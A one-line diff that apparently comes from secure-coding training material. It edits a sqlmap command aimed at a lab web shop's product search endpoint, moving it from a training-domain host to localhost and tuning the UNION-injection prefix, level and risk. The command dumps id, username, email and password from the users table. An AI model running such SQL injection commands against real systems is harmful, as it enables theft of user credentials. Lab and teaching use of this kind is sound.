@@ -1,1 +1,1 @@
-sqlmap -u "https://74199f44.labs.secure-coding-schulung.de/rest/product/search?q=apple" -p q --level=3 --risk=1 -v 3 --dbms sqlite --flush-session --dump --no-cast --no-escape -T users -C "id,username,email,password"
+sqlmap -u "http://localhost:3000/rest/products/search?q=apple" -p "q" --technique=U --prefix "')) " --level=5 --risk=3 -v 3 --dbms="sqlite" --flush-session --dump --no-cast --no-escape -T users -C "id,username,email,password"
